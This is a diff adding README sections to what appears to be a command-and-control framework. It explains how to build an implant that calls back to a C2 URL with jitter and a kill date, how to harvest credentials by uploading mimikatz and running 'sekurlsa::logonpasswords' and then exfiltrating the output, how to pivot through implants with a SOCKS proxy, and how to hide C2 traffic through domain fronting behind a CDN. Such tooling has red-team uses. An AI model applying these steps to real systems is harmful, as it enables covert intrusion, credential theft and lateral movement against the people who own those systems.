@@ -167,6 +167,33 @@ docker-compose -f docker/docker-compose.c2-only.yml up --build
 
 If the server uses `op_token`, rebuild the web-ui with build arg `REACT_APP_OP_TOKEN=your-key` (e.g. in the compose file or via `docker-compose build --build-arg REACT_APP_OP_TOKEN=your-key web-ui`).
 
+## Multiple listeners
+
+In `config.json` you can set `listeners` (array of `{port, tls, cert_file, key_file}`). If non-empty, the server starts one HTTP(S) server per listener; all serve the same routes. Use this to expose C2 on multiple ports or with/without TLS. Sync and WebSocket URLs depend on which listener you use (e.g. `https://host:8443/sync` vs `https://host:8444/sync`).
+
+## Payload build (client)
+
+From the repo root, `scripts/build_client.sh` builds the Go client. You can embed config so the binary works without `config.json` on target:
+
+```bash
+SERVER_URL=wss://c2.example.com/live CLIENT_ID=myid CLIENT_SECRET=secret ./scripts/build_client.sh
+# Or: ./scripts/build_client.sh wss://c2.example.com/live myid mysecret
+```
+
+Optional env (or positional args): `CALLBACK_INTERVAL`, `JITTER_PERCENT`, `KILL_DATE`, `WORKING_HOURS_START`, `WORKING_HOURS_END`. Output: `client/client`.
+
+## Credential harvesting
+
+The C2 does not ship credential tools (e.g. Mimikatz). To harvest credentials: use **File Manager** to upload your preferred tool to the target, then use **Console** (or POST /op/exec) to run it. Example: upload `mimikatz.exe` to `C:\temp\`, then exec `C:\temp\mimikatz.exe sekurlsa::logonpasswords`. Store output or exfiltrate via download. Optional **Run creds** in the UI sends a `creds` command that may return a placeholder or minimal info per OS; extend the implant to run your own one-liner if desired.
+
+## SOCKS proxy (pivot)
+
+Set `socks_port` in server `config.json` (e.g. 1080). The server listens for SOCKS5 connections; when an operator connects (e.g. `curl --socks5 host:1080 http://internal-host/`), the server assigns the connection to the first available implant session and sends a connect request to the implant. The implant opens TCP to the target and relays traffic. PowerShell implant does not support SOCKS; use the Go client.
+
+## Deploying behind a CDN (domain fronting)
+
+You can put the C2 server behind a CDN (e.g. CloudFront, Cloudflare) so traffic appears to go to a front domain. Point implants at the CDN URL; the CDN forwards to your server (e.g. by host header or path). Use a custom Host header so the server only accepts requests for your fronted hostname. Optional: set `accept_hosts` in config (if implemented) so the server rejects requests whose Host header is not in the list. TLS SNI and Host header can differ (domain fronting). Document your CDN origin and routing so operators use the correct implant URL.
+
 ## Quick reference
 
 | Item          | Value |
